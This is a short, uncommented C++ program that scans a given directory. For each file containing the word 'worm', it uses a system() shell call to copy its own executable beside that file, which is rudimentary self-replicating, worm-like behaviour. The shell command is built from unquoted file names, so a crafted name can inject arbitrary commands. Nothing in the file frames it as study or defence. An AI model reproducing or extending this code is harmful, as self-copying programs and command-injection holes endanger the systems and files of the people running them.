#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <dirent.h>

using namespace std;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        cout << "Usage: " << argv[0] << " <directory>" << endl;
        exit(1);
    }

    DIR* dir;
    struct dirent* entry;
    if ((dir = opendir(argv[1])) == NULL) {
        cout << "Error opening directory" << endl;
        exit(1);
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char buf[1024];
            snprintf(buf, 1024, "%s/%s", argv[1], entry->d_name);
            ifstream infile(buf);
            string line;
            while (getline(infile, line)) {
                if (line.find("worm") != string::npos) {
                    char cmd[1024];
                    snprintf(cmd, 1024, "cp %s %s-worm", argv[0], buf);
                    system(cmd);
                    break;
                }
            }
        }
    }

    closedir(dir);
    return 0;
}
